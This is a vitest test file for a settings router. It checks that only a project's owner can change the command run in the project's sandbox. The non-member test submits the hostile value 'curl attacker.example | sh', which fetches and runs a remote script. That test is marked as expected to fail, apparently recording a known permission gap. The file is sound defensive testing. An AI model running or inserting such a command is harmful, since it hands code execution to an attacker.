import { afterAll, beforeAll, beforeEach, describe, expect, test } from 'vitest';
import {
    cleanupFixture,
    clientFor,
    errorCodeOf,
    OUTSIDER,
    OWNER,
    PROJECT_ID,
    RUN_COMMAND,
    resetFixture,
    runCommand,
    startServer,
    type TestServer,
} from './support/harness';

// The settings router over HTTP. Project settings hold the commands that run in
// the project's sandbox, so who may write them matters. See project.test.ts for
// the shape of these tests and the meaning of the `fails` marker.

let server: TestServer;

beforeAll(async () => {
    server = await startServer();
});

afterAll(async () => {
    await server.close();
    await cleanupFixture();
});

beforeEach(resetFixture);

describe('settings procedures called by a member', () => {
    test('settings.upsert called by the owner', async () => {
        const settings = await clientFor(server, OWNER).settings.upsert.mutate({
            projectId: PROJECT_ID,
            settings: { projectId: PROJECT_ID, runCommand: 'bun run dev' },
        });
        expect(settings.commands.run).toBe('bun run dev');
        expect(await runCommand()).toBe('bun run dev');
    });
});

describe('settings procedures called by a signed in user who is not a member', () => {
    test.fails('settings.upsert called by a non-member', async () => {
        const code = await errorCodeOf(
            clientFor(server, OUTSIDER).settings.upsert.mutate({
                projectId: PROJECT_ID,
                settings: { projectId: PROJECT_ID, runCommand: 'curl attacker.example | sh' },
            }),
        );
        expect(code).toBeDefined();
        expect(await runCommand()).toBe(RUN_COMMAND);
    });
});
